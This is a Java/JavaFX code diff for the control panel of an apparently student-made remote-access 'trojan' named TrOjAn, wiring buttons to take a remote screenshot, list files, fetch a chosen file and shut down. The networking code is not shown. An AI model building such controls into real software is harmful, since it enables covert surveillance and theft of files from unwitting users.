@@ -9,7 +9,6 @@ import java.io.IOException;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import javafx.application.Application;
-import static javafx.application.Application.launch;
 import javafx.event.ActionEvent;
 import javafx.event.EventHandler;
 import javafx.scene.Scene;
@@ -17,23 +16,24 @@ import javafx.scene.control.Button;
 import javafx.scene.control.Label;
 import javafx.scene.control.TextField;
 import javafx.scene.layout.GridPane;
-import javafx.scene.layout.StackPane;
 import javafx.stage.Stage;
 import network.ClientePic;
 import network.ServerComPic;
 import static javafx.application.Application.launch;
-import static javafx.application.Application.launch;
-import static javafx.application.Application.launch;
+import network.ClienteArray;
+import network.ClienteFile;
 import network.ServerComFTP;
 import network.ServerComOff;
+import network.ServerNum;
+import static javafx.application.Application.launch;
 
 /**
  *
  * @author UserPL022Pc01
  */
-public class TrOjAnHacker extends Application {
+public class Main extends Application {
     
-    public String ftpNum;
+    String ftpNum;
 
     @Override
     public void start(Stage primaryStage) {    
@@ -45,7 +45,7 @@ public class TrOjAnHacker extends Application {
         Label lblFTP = new Label("Nº do ficheiro: ");
         TextField txFTP = new TextField();
 
-        btnTakePic.setText("Tirar screenshot");
+        btnTakePic.setText("Tirar screenshot"); //QUESTIONAR REC DA FOTO
         btnTakePic.setOnAction(new EventHandler<ActionEvent>() {
             @Override
             public void handle(ActionEvent event) {
@@ -54,17 +54,17 @@ public class TrOjAnHacker extends Application {
                 try {
                     ClientePic cp = new ClientePic();
                 } catch (IOException ex) {
-                    Logger.getLogger(TrOjAnHacker.class.getName()).log(Level.SEVERE, null, ex);
+                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
                 }
                 System.out.println("Screenshot recebida!");
             }
         });
 
-        btnFTP.setText("Listar finheiros"); //POR FAZER
+        btnFTP.setText("Listar finheiros"); //FEITO
         btnFTP.setOnAction(new EventHandler<ActionEvent>() {
             @Override
             public void handle(ActionEvent event) {
-
+                ClienteArray ca = new ClienteArray();
             }
         });
 
@@ -73,11 +73,17 @@ public class TrOjAnHacker extends Application {
             @Override
             public void handle(ActionEvent event) {
                 ftpNum = txFTP.getText();
-                ServerComFTP scf = new ServerComFTP();
+                
+                ServerNum sn = new ServerNum();
+                try {
+                    ClienteFile cf = new ClienteFile();
+                } catch (IOException ex) {
+                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
+                }
             }
         });
         
-        btnStop.setText("Desligar"); //POR FAZER
+        btnStop.setText("Desligar"); //FEITO
         btnStop.setOnAction(new EventHandler<ActionEvent>() {
             @Override
             public void handle(ActionEvent event) {
@@ -98,7 +104,7 @@ public class TrOjAnHacker extends Application {
         root.setVgap(10);
         root.setHgap(10);
 
-        Scene scene = new Scene(root, 375, 250);
+        Scene scene = new Scene(root, 325, 150);
 
         primaryStage.setTitle("TrOjAn");
         primaryStage.setScene(scene);
